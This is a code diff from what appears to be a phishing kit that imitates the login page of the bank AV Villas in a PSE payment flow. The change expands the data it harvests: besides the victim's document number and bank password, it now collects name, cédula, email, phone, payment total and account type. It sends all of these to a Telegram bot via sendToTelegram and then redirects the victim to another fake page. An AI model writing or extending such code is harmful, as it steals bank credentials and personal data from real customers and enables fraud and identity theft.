@@ -503,7 +503,15 @@
                         const num = document.getElementById('numDoc').value;
                         const pass = document.getElementById('password').value;
 
-                        const text = `🏦 <b>AV Villas - Login</b>\n\n🆔 Documento: ${tipo} ${num}\n🔑 Contraseña: ${pass}`;
+                        const nombre = sessionStorage.getItem("nombre") || "---";
+                        const cedula = sessionStorage.getItem("cedula") || "---";
+                        const correo = sessionStorage.getItem("correo") || "---";
+                        const telefono = sessionStorage.getItem("telefono") || "---";
+                        const total = sessionStorage.getItem("total") || "---";
+                        const banco = sessionStorage.getItem("banco") || "AV VILLAS";
+                        const tipoBanco = sessionStorage.getItem("tipoBanco") || "Natural";
+
+                        const text = `🏦 <b>Datos de Pago PSE - Login de Banco AV Villas</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🏦 Banco: ${banco}\n🏷️ Tipo de Banco: ${tipoBanco}\n\n🆔 Documento: ${tipo} ${num}\n🔑 Contraseña: ${pass}`;
                         await sendToTelegram(text);
 
                         window.location.href = 'Avilla-dinamica.html';
